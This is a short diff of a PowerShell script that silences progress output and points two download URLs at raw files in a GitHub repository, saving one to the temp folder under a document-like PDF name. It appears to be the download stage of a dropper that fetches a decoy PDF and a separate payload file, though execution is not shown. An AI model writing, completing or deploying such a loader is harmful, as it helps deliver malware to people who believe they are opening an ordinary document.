@@ -1,7 +1,7 @@
 $ProgressPreference = 'SilentlyContinue'
 
-$File1Url = "http://yourserver.com/file1.exe" 
-$File2Url = "http://yourserver.com/file2.exe" 
+$File1Url = "https://github.com/rosawatsn/lnk/raw/refs/heads/main/fls/doc.pdf" 
+$File2Url = "https://github.com/rosawatsn/lnk/raw/refs/heads/main/res/resource" 
 
 $File1Path = "$env:TEMP\DOC-8796578552.pdf"
 
